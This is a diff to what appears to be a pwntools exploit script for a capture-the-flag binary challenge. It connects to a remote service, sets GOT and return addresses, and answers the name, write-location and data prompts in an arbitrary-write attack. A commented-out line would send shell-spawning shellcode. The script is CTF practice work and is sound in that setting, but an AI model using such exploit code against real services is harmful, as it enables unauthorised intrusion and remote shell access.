@@ -9,6 +9,27 @@ port = 8888
 
 r = remote(host, port)
 
-read_input_addr = 0x6010a0
+put_got = 0x601020
+read_got = 0x601048
 
-r.recvuntil(
+your_name_addr = 0x6010a0
+where_want_write = 0x40098d
+ret_addr = 0x7fffffffdcd8
+
+input('Press enter to continue.')
+
+# what's your name :
+r.recvuntil(':')
+# r.sendline(asm(pwnlib.shellcraft.linux.sh()))
+r.sendline(b'aaaaaaaaaaaaaaaa')
+
+# Where do you want to write :
+r.recvuntil(':')
+r.sendline(hex(ret_addr).encode())
+
+# data :
+r.recvuntil(':')
+r.sendline(b'a'*8)
+# r.sendline(p64(where_want_write))
+
+r.interactive()
